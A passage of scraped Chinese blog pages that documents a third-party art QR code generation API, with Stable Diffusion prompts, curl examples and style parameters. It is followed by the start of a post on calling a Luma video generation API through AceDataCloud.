                  <p>接下来，我们来生成一个知数云官网的二维码，类型是链接，内容是 <a href="https://data.zhishuyun.com" target="_blank" rel="noopener" title="https://data.zhishuyun.com">https://data.zhishuyun.com</a>，prompt 这里填写如下内容：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">(best quality, <span class="attr">masterpiece</span>:<span class="number">1.2</span>), underwater, ((pirate ship)), close up, zoom <span class="keyword">in</span>, absurdes, big waves, twister, water falling, tentacles, ((glowing lights)), ((lighting storm)), fog, smoke, <span class="number">4</span>k res, <span class="number">8</span>k, higly detailed textures, cinematic shot, intricate details, side view</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在测试页面填写如下内容：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-175640.png" alt=""></p>
                  <p>然后点击测试：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-172030.png" alt=""></p>
                  <p>过一会就发现艺术二维码就生成了，结果类似如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"task_id"</span>: <span class="string">"a7e8831c-203d-447e-83fc-71783c766446"</span>,</span><br><span class="line">  <span class="string">"image_url"</span>: <span class="string">"https://qrart.cdn.zhishuyun.com/attachments/1132182283529494652/1136344944630563006/Germey_2023-08-02__64ca8da51e5834b500e077bf.png"</span>,</span><br><span class="line">  <span class="string">"image_width"</span>: <span class="number">768</span>,</span><br><span class="line">  <span class="string">"image_height"</span>: <span class="number">768</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>二维码如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-175711.png" alt=""></p>
                  <p>这样我们就生成了一个二维码，主体是一个船只，悬挂着几个旗帜，而这些旗帜恰恰构成了二维码的定位点。</p>
                  <p>用手机扫描一下，就可以跳转到知数云的官网了。</p>
                  <p>同时上述内容调用方案我们可以非常方便地转成 API 调用。</p>
                  <h2 id="prompt-指南"><a href="#prompt-指南" class="headerlink" title="prompt 指南"></a>prompt 指南</h2>
                  <p>通过上述操作可以看到，艺术二维码关键在于 prompt 的编写，那 prompt 的编写都有什么讲究呢？</p>
                  <p>其实这个都是通用的 Stable Diffusion 的 prompt 指令，艺术二维码就是基于 Stable Diffusion 技术加上一些特殊调优生成的，所以它的输入 prompt 和 Stable Diffusion 是完全一样的。</p>
                  <p>如果你还不知道什么是 Stable Diffusion，可以到它的官网了解下：<a href="https://stablediffusionweb.com/" target="_blank" rel="noopener" title="https://stablediffusionweb.com/">https://stablediffusionweb.com/</a>，还有prompt 教程和指南：<a href="https://stable-diffusion-art.com/prompt-guide/" target="_blank" rel="noopener" title="https://stable-diffusion-art.com/prompt-guide/">https://stable-diffusion-art.com/prompt-guide/</a>，另外 Stable Diffusion 还制作了 prompt 生成器，可以帮助我们生成 prompt：<a href="https://stablediffusionweb.com/prompt-generator" target="_blank" rel="noopener" title="https://stablediffusionweb.com/prompt-generator">https://stablediffusionweb.com/prompt-generator</a>，除此之外还有一些 prompt 样例集合网站：<a href="https://publicprompts.art/" target="_blank" rel="noopener" title="https://publicprompts.art/">https://publicprompts.art/</a></p>
                  <p>如上内容仅作参考，如果更多，可以自行搜索 Stable Diffusion 相关的资料进行学习。</p>
                  <h2 id="高级参数"><a href="#高级参数" class="headerlink" title="高级参数"></a>高级参数</h2>
                  <p>本 API 还提供了更多高级参数方便进行更多功能定制，说明如下：</p>
                  <ul>
                    <li>preset：预设背景风格。二维码背景的风格，如超现实风格、霓虹效果、手绘风格等。</li>
                    <li>steps：绘制迭代次数。当次数越大，绘制的二维码艺术风格越强，范围为 10-20，默认是 16。</li>
                    <li>qrw：二维码的权重。当权重越大，图片越接近真实二维码，但是艺术化的风格会减弱，取值范围是 1.5-3，默认是 1.5。</li>
                    <li>seed：随机种子。用于生成随机二维码，当种子相同时，生成的二维码风格是一样的，范围为 1-9007199254740991。</li>
                    <li>rawurl：是否保持原始链接。默认情况下会将输入链接缩短为短链接，可以提高扫码率，该值默认为 false。</li>
                    <li>padding_level：二维码内边距。二维码内边距的大小，</li>
                    <li>aspect_ratio：二维码宽高比。</li>
                    <li>position：二维码位置。</li>
                    <li>pixel_style：二维码像素风格。</li>
                    <li>marker_shape：二维码定位框形状。</li>
                    <li>sub_marker：二维码子标记样式。</li>
                    <li>rotate：二维码旋转角度。</li>
                    <li>ecl：二维码纠错等级。</li>
                    <li>padding_noise：二维码内边距噪点。</li>
                    <li>pattern：预设二维码组合。预设二维码风格组合，如定位框的样式（方形、圆形等）、点的样式（方形、圆形等）。</li>
                  </ul>
                  <p>下文我们来详细了解下艺术二维码 API 的一些高级参数，选取其中一些进行介绍。</p>
                  <h2 id="预设-preset"><a href="#预设-preset" class="headerlink" title="预设 preset"></a>预设 preset</h2>
                  <p>艺术二维码 API 设置了很多预设模板，这个参数叫做 preset，取值如下：</p>
                  <ul>
                    <li>sunset（日落）: 融合了夕阳余晖的温暖色调和柔和光线效果。</li>
                    <li>floral（花卉）: 带有花朵和植物元素的艺术风格，强调自然之美。</li>
                    <li>snowflakes（雪花）: 冰雪世界，具有冰晶和雪花的冷酷氛围。</li>
                    <li>feathers（羽毛）: 呈现出羽毛和鸟类特征，营造轻盈和柔软的感觉。</li>
                    <li>raindrops（雨滴）: 以雨滴和水珠为灵感，创造出清新湿润的效果。</li>
                    <li>ultra-realism（超现实）: 极度逼真的细节和质感，营造出超越现实的效果。</li>
                    <li>epic-realms（史诗领域）: 壮丽的场景和史诗感，带来宏大的视觉体验。</li>
                    <li>intricate-studio（错综复杂）: 富有细节和复杂性，需要仔细观察才能完全理解的风格。</li>
                    <li>symmetric-masterpiece（对称杰作）: 通过对称元素创造出精美的平衡和谐。</li>
                    <li>luminous-highway（发光高速公路）: 强调夜间的发光效果，如车灯和霓虹灯。</li>
                    <li>celestial-journey（星际之旅）: 探索宇宙和星际的奇幻旅程。</li>
                    <li>neon-mech（霓虹机械）: 结合了霓虹灯和机械元素，营造出未来感。</li>
                    <li>ethereal-low-poly（飘渺低多边形）: 低多边形风格，创造出虚幻和抽象的效果。</li>
                    <li>golden-vista（金色景观）: 以金色调为主，呈现出壮观的视觉景象。</li>
                    <li>cinematic-expanse（电影式广袤）: 带有电影感的广阔场景，引人入胜。</li>
                    <li>cinematic-warm（电影式温暖）: 具有电影质感的温暖色调和光线效果。</li>
                    <li>desolate-wilderness（荒凉荒野）: 描绘荒芜和荒野，营造出孤寂感。</li>
                    <li>vibrant-palette（鲜明调色板）: 色彩丰富多样，强烈的色彩对比。</li>
                    <li>enigmatic-journey（神秘之旅）: 探索充满谜团和神秘感的旅程。</li>
                    <li>timeless-cinematic（永恒电影）: 具有电影质感且不受时间限制的风格。</li>
                    <li>regal-galaxy（皇家星系）: 带有皇家气息的星系和宇宙元素。</li>
                    <li>illustrious-canvas（杰出画布）: 创作出卓越而引人注目的画布效果。</li>
                    <li>expressive-mural（富有表现力的壁画）: 充满表现力和情感的大型壁画风格。</li>
                    <li>serene-haze（宁静薄雾）: 带有宁静和薄雾效果，营造出宁静的氛围。</li>
                  </ul>
                  <p>我们下面来尝试下不同参数的效果，比如拿 sunset（日落）和 raindrops（雨滴）为例来看下效果。</p>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST <span class="string">"https://api.zhishuyun.com/qrart/generate?token=&#123;token&#125;"</span> \</span><br><span class="line">  -H <span class="string">"accept: application/json"</span> \</span><br><span class="line">  -H <span class="string">"content-type: application/json"</span> \</span><br><span class="line">  -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">    "type": "link",</span></span><br><span class="line"><span class="string">    "content": "https://data.zhishuyun.com",</span></span><br><span class="line"><span class="string">    "prompt": "sakura",</span></span><br><span class="line"><span class="string">    "preset": "sunset"</span></span><br><span class="line"><span class="string">  &#125;'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们把 preset 设置为了 sunset（日落效果），效果如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-174003.png" alt=""></p>
                  <p>如果我们换个风格，比如把 preset 参数换成 raindrops（雨滴效果），效果如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-174249.png" alt=""></p>
                  <p>关于其他的一些设定大家可以自行试验。</p>
                  <h2 id="二维码宽高比-aspect-ratio"><a href="#二维码宽高比-aspect-ratio" class="headerlink" title="二维码宽高比 aspect_ratio"></a>二维码宽高比 aspect_ratio</h2>
                  <p>通过 aspect_ratio 参数我们可以设置二维码的宽高比，比如正方形 1:1，长方形 16:9 等等，该参数：</p>
                  <ul>
                    <li>768x768：宽高比为 1:1，表示画布的宽度和高度相等。对应的像素尺寸为 768x768，生成的二维码画布为正方形。</li>
                    <li>1008x576：宽高比为 16:9，表示画布的宽度是高度的 16/9 倍。对应的像素尺寸为 1008x576，生成的二维码画布宽度较大，适合宽屏显示。</li>
                    <li>576x1008：宽高比为 9:16，表示画布的宽度是高度的 9/16 倍。对应的像素尺寸为 576x1008，生成的二维码画布高度较大，适合竖屏显示。</li>
                    <li>864x672：宽高比为 4:3，表示画布的宽度是高度的 4/3 倍。对应的像素尺寸为 864x672，生成的二维码画布略带正方形感，适合一般显示。</li>
                    <li>672x864：宽高比为 3:4，表示画布的宽度是高度的 3/4 倍。对应的像素尺寸为 672x864，生成的二维码画布略带纵向矩形感，适合一般显示。</li>
                  </ul>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST <span class="string">"https://api.zhishuyun.com/qrart/generate?token=&#123;token&#125;"</span> \</span><br><span class="line">  -H <span class="string">"accept: application/json"</span> \</span><br><span class="line">  -H <span class="string">"content-type: application/json"</span> \</span><br><span class="line">  -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">    "type": "link",</span></span><br><span class="line"><span class="string">    "content": "https://data.zhishuyun.com",</span></span><br><span class="line"><span class="string">    "prompt": "Fish",</span></span><br><span class="line"><span class="string">    "aspect_ratio": "576x1008"</span></span><br><span class="line"><span class="string">  &#125;'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们尝试生成了一个长方形的二维码，效果如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-175104.png" alt=""></p>
                  <h2 id="二维码位置-position"><a href="#二维码位置-position" class="headerlink" title="二维码位置 position"></a>二维码位置 position</h2>
                  <p>我们还可以通过 position 参数控制二维码的位置，比如说一张图片里面有一个女生穿裙子，而我们想要把二维码放在裙子的位置并与之融合起来，我们就可以尝试改下二维码的位置，调用样例如下：</p>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST <span class="string">"https://api.zhishuyun.com/qrart/generate?token=&#123;token&#125;"</span> \</span><br><span class="line">  -H <span class="string">"accept: application/json"</span> \</span><br><span class="line">  -H <span class="string">"content-type: application/json"</span> \</span><br><span class="line">  -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">    "type": "link",</span></span><br><span class="line"><span class="string">    "content": "https://data.zhishuyun.com",</span></span><br><span class="line"><span class="string">    "prompt": "one of the beautiful girls in the moonlight in the background, in the style of pixelated chaos, rococo-inspired art, dark white and sky-blue, made of plastic, delicate flowers, gongbi, wimmelbilder",</span></span><br><span class="line"><span class="string">    "position": "bottom",</span></span><br><span class="line"><span class="string">    "aspect_ratio": "576x1008"</span></span><br><span class="line"><span class="string">  &#125;'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>效果如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-24-170641.png" alt=""></p>
                  <h2 id="二维码像素风格-pixel-style"><a href="#二维码像素风格-pixel-style" class="headerlink" title="二维码像素风格 pixel_style"></a>二维码像素风格 pixel_style</h2>
                  <p>我们还可以自定义二维码的像素风格，通过传入 pixel_style 即可，参数可选值如下：</p>
                  <ul>
                    <li>square（方形）：使用方形的像素单元，每个像素单元都是正方形的形状。</li>
                    <li>rounded（圆角）：像素单元具有圆角，使得生成的二维码看起来更加柔和和现代化。</li>
                    <li>dot（点状）：使用小圆点作为像素单元，生成的二维码呈现出点阵的效果，类似于印刷效果。</li>
                    <li>squircle（圆角方形）：类似于圆角矩形，但更加接近圆形的形状，为生成的二维码赋予一种独特的风格。</li>
                    <li>row（行排列）：将像素单元按行排列，呈现出水平方向的图案。</li>
                    <li>column（列排列）：将像素单元按列排列，呈现出垂直方向的图案。</li>
                  </ul>
                  <p>样式预览如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-172007.png" alt=""></p>
                  <h2 id="二维码框风格-marker-shape"><a href="#二维码框风格-marker-shape" class="headerlink" title="二维码框风格 marker_shape"></a>二维码框风格 marker_shape</h2>
                  <p>通过 marker_shape 可以自定义定位框的风格，参数可选值如下：</p>
                  <ul>
                    <li>square（方形）：标记形状为正方形，用于突出特定位置或元素。</li>
                    <li>circle（圆形）：标记形状为圆形，可用于标记关键区域或元素。</li>
                    <li>plus（加号）：标记形状为加号，类似十字型，用于突出注意或特定信息。</li>
                    <li>box（方框）：标记形状为方框，类似于描边的矩形，可用于围绕区域或元素。</li>
                    <li>octagon（八边形）：标记形状为八边形，带有独特的角落，用于视觉吸引。</li>
                    <li>random（随机）：标记形状随机分布，为二维码添加艺术感和视觉趣味。</li>
                    <li>tiny-plus（微小加号）：微小的加号标记，可用于标记细微的元素或细节。</li>
                  </ul>
                  <p>样式预览如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-172144.png" alt=""></p>
                  <h2 id="二维码子标记风格-sub-marker"><a href="#二维码子标记风格-sub-marker" class="headerlink" title="二维码子标记风格 sub_marker"></a>二维码子标记风格 sub_marker</h2>
                  <p>通过 sub_marker 可以用于子标记（较小的标记）的形状，参数可选值如下：</p>
                  <ul>
                    <li>square（方形）：子标记的形状为正方形，可以用于突出特定位置的细节。</li>
                    <li>circle（圆形）：子标记的形状为圆形，可用于强调关键细节或元素。</li>
                    <li>box（方框）：子标记的形状为方框，类似于描边的矩形，适用于标记细小区域。</li>
                    <li>random（随机）：子标记的形状随机分布，为二维码添加艺术感和视觉趣味。</li>
                    <li>plus（加号）：子标记的形状为加号，类似十字型，可以用于标记细微的信息或元素。</li>
                  </ul>
                  <h2 id="二维码旋转角度-rotate"><a href="#二维码旋转角度-rotate" class="headerlink" title="二维码旋转角度 rotate"></a>二维码旋转角度 rotate</h2>
                  <p>通过 rotate 可以控制二维码的旋转角度，参数可选值如下：</p>
                  <ul>
                    <li>0：不进行旋转，生成的二维码保持原始方向，没有旋转效果。</li>
                    <li>90：将生成的二维码顺时针旋转90度，使其以纵向方向显示。</li>
                    <li>180：将生成的二维码旋转180度，使其倒置，即上下颠倒的显示方式。</li>
                    <li>270：将生成的二维码顺时针旋转270度，使其以逆纵向方向显示。</li>
                  </ul>
                  <h2 id="二维码预设-pattern"><a href="#二维码预设-pattern" class="headerlink" title="二维码预设 pattern"></a>二维码预设 pattern</h2>
                  <p>通过 pattern 可以方便地启用一些二维码样式风格，比如方形的定位框、圆形的像素点等等，这里预定义了一些 pattern：</p>
                  <div class="table-container">
                    <table>
                      <thead>
                        <tr>
                          <th>pattern</th>
                          <th>含义</th>
                          <th></th>
                        </tr>
                      </thead>
                      <tbody>
                        <tr>
                          <td>s1</td>
                          <td>pixel_style: square marker_shape: square</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173018.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>s2</td>
                          <td>pixel_style: square marker_shape: square rotate: 180</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173030.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>s3</td>
                          <td>pixel_style: square marker_shape: square rotate: 180custom_padding_noise: 0.25</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173222.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>rd1</td>
                          <td>pixel_style: rounded marker_shape: random</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173237.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>rd2</td>
                          <td>pixel_style: rounded marker_shape: random rotate: 180</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173251.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>rd3</td>
                          <td>pixel_style: rounded marker_shape: random rotate: 180custom_padding_noise: 0.25</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173304.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>d1</td>
                          <td>pixel_style: dot marker_shape: circle</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173315.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>d2</td>
                          <td>pixel_style: dot marker_shape: circle rotate: 180</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173326.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>d3</td>
                          <td>pixel_style: dot marker_shape: circle rotate: 180custom_padding_noise: 0.25</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173337.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>r1</td>
                          <td>pixel_style: row marker_shape: plus</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173411.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>r2</td>
                          <td>pixel_style: row marker_shape: plus rotate: 180</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173424.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>r3</td>
                          <td>pixel_style: row marker_shape: plus rotate: 180custom_padding_noise: 0.25</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173437.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>c1</td>
                          <td>pixel_style: column marker_shape: box</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173455.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>c2</td>
                          <td>pixel_style: column marker_shape: box rotate: 180</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173508.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>c3</td>
                          <td>pixel_style: column marker_shape: box rotate: 180custom_padding_noise: 0.25</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173519.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>sq1</td>
                          <td>pixel_style: squircle marker_shape: random</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173532.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>sq2</td>
                          <td>pixel_style: squircle marker_shape: random rotate: 180</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173545.png" alt="img"></td>
                        </tr>
                        <tr>
                          <td>sq3</td>
                          <td>pixel_style: squircle marker_shape: random rotate: 180custom_padding_noise: 0.25</td>
                          <td><img src="https://cdn.zhishuyun.com/2023-08-28-173558.png" alt="img"></td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-12-12 20:01:22" itemprop="dateCreated datePublished" datetime="2024-12-12T20:01:22+08:00">2024-12-12</time>
                </span>
                <span id="/42370.html" class="post-meta-item leancloud_visitors" data-flag-title="二维码耍出新花样，充满创意艺术" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>7.6k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>7 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42369.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Luma <i class="label-arrow"></i>
                  </a>
                  <a href="/42369.html" class="post-title-link" itemprop="url">Luma 视频生成 API 对接说明</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>随着 AI 的应用变广，各类 AI 程序已逐渐普及。AI 已逐渐深入到人们的工作生活方方面面。而 AI 涉及的行业也越来越多，从最初的写作，到医疗教育，再到现在的视频。</p>
                  <p>Luma 是一个专业高质量的视频生成平台，用户只需上传素材，即可根据不同风格和效果自动生成高质量视频。该 AI 视频生成器由来自知名科技公司的团队成员开发，目标是无需复杂的编辑工具，让每个人都能轻松制作出色的视频。</p>
                  <p>然而 Luma 官方是并没有提供 API 的，AceDataCloud 提供了一套 Luma 的 API，模拟对接了 Suno 官方，可以方便快捷地生成想要的视频。</p>
                  <h2 id="申请和使用"><a href="#申请和使用" class="headerlink" title="申请和使用"></a>申请和使用</h2>
                  <p>要使用 Luma Videos API，首先可以到 <a href="https://platform.acedata.cloud/documents/5bd3597d-1ff8-44ad-a580-b66b48393e7f" target="_blank" rel="noopener">Luma Videos Generation API</a> 页面点击「Acquire」按钮，获取请求所需要的凭证：</p>
                  <p><img src="https://cdn.acedata.cloud/nyq0xz.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>想要生成什么视频，可以任意输入一段文字，比如我想生成一个关于宇航员穿梭于太空和火山之间的视频，就可以输入 <code>Astronauts shuttle from space to volcano</code>，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/yub02j.png" width="500" class="m-auto"></p>
                  <p>生成的代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/ieq7yn.png" width="500" class="m-auto"></p>
                  <p>可以点击「Try」按钮直接测试 API，稍等 1-2 分钟，结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"e4018a99-1522-4f24-9330-62c2a9b50b59"</span>,</span><br><span class="line">  <span class="attr">"video_id"</span>: <span class="string">"155838f8-7f1e-44d8-b387-192f3b4b509d"</span>,</span><br><span class="line">  <span class="attr">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span>,</span><br><span class="line">  <span class="attr">"video_url"</span>: <span class="string">"https://storage.cdn-luma.com/dream_machine/af94e7ca-da35-4b5f-a636-2d7254184d0d/watermarked_video0585de3737db946e5a0ac895384ecd180.mp4"</span>,</span><br><span class="line">  <span class="attr">"video_height"</span>: <span class="number">752</span>,</span><br><span class="line">  <span class="attr">"video_width"</span>: <span class="number">1360</span>,</span><br><span class="line">  <span class="attr">"state"</span>: <span class="string">"completed"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/luma/e4018a99-1522-4f24-9330-62c2a9b50b59.jpg"</span>,</span><br><span class="line">  <span class="attr">"thumbnail_width"</span>: <span class="number">1360</span>,</span><br><span class="line">  <span class="attr">"thumbnail_height"</span>: <span class="number">752</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到这时候我们就得到了这个视频的相关信息，包括视频ID、视频链接、视频封面等内容。</p>
                  <p>字段说明如下：</p>
                  <ul>
                    <li>success：生成是否成功，如果成功则为 <code>true</code>，否则为 <code>false</code></li>
                    <li>task_id：此处视频生成任务的唯一ID</li>
                    <li>video_id：此处视频生成任务产生的视频唯一ID</li>
                    <li>prompt：此处视频生成任务的关键词</li>
                    <li>video_url：此处视频生成任务的结果视频链接</li>
                    <li>video_height：生成后的视频封面图片的高度</li>
                    <li>video_width：生成后的视频封面图片的宽度</li>
                    <li>state：此处视频生成任务的状态，如果任务完成的话则为 <code>completed</code>。</li>
                    <li>thumbnail_url：生成后的视频封面图片的链接</li>
                    <li>thumbnail_width：生成后的视频封面图片的宽度</li>
                    <li>thumbnail_height：生成后的视频封面图片的高度</li>
                  </ul>
                  <h2 id="自定义首尾帧生成"><a href="#自定义首尾帧生成" class="headerlink" title="自定义首尾帧生成"></a>自定义首尾帧生成</h2>
                  <p>如果想通过自定义视频的首尾帧来生成视频，可以输入首尾帧的图片链接：</p>
                  <p>这时候视频首帧 <code>start_image_url</code> 字段可以传入以下图片作为视频的首帧：</p>
                  <p><img src="https://cdn.acedata.cloud/r9vsv9.png" alt="首帧"></p>
                  <p>接下来我们要根据首尾帧、关键词自定义生成视频，就可以指定如下内容：</p>
                  <ul>
                    <li>action：视频生成任务的行为，通常是普通生成 <code>generate</code> 和扩展生成 <code>extend</code>，默认为 <code>generate</code>。</li>
                    <li>start_image_url：指定生成视频的首帧。</li>
                    <li>end_image_url：指定生成视频的尾帧。</li>
                    <li>prompt：生成视频的关键词内容。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/zvzydx.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/tx80pu.png" width="500" class="m-auto"></p>
                  <p>对应的代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.acedata.cloud/luma/videos"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"accept"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">    <span class="string">"authorization"</span>: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">    <span class="string">"content-type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"start_image_url"</span>: <span class="string">"https://cdn.acedata.cloud/r9vsv9.png"</span>,</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"generate"</span>,</span><br><span class="line">    <span class="string">"prompt"</span>: <span class="string">"Astronauts shuttle from space to volcano"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload, headers=headers)</span><br><span class="line">print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>得到的结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
